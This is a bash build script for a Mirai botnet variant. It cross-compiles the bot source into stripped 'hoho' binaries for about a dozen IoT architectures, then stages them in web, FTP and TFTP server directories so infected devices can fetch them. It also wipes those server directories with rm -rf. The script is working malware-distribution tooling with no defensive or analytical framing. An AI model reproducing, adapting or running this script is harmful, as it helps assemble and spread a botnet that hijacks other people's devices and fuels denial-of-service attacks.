#!/bin/bash
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export PATH=$PATH:/etc/xcompile/arc/bin
function compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
    "$1-strip" release/"$2" -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr
}
function arm7_compile_bot {
    "$1-gcc" -std=c99 $3 bot/*.c -O3 -lpthread -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -o release/"$2" -DMIRAI_BOT_ARCH=\""$1"\"
}

function arc_compile {
    "$1-linux-gcc" -DMIRAI_BOT_ARCH="$3" -std=c99 bot/*.c -s -O3 -lpthread -o release/"$2"
}

rm -rf ~/release
mkdir ~/release
rm -rf /var/www/html
rm -rf /var/lib/tftpboot
rm -rf /var/ftp
mkdir /var/ftp
mkdir /var/lib/tftpboot
mkdir /var/www/html
mkdir /var/www/html/bins

arc_compile arc hoho.arc "-static"
compile_bot i586 hoho.x86 "-static"
compile_bot mips hoho.mips "-static"
compile_bot mipsel hoho.mpsl "-static"
compile_bot armv4l hoho.arm "-static"
compile_bot armv5l hoho.arm5 "-static"
compile_bot armv6l hoho.arm6 "-static"
arm7_compile_bot armv7l hoho.arm7 "-static"
compile_bot powerpc hoho.ppc "-static"
compile_bot sparc hoho.spc "-static"
compile_bot m68k hoho.m68k "-static"
compile_bot sh4 hoho.sh4 "-static"

cp release/* /var/www/html/bins
cp release/* /var/ftp
mv release/* /var/lib/tftpboot
rm -rf release
rm -rf bot

echo "done."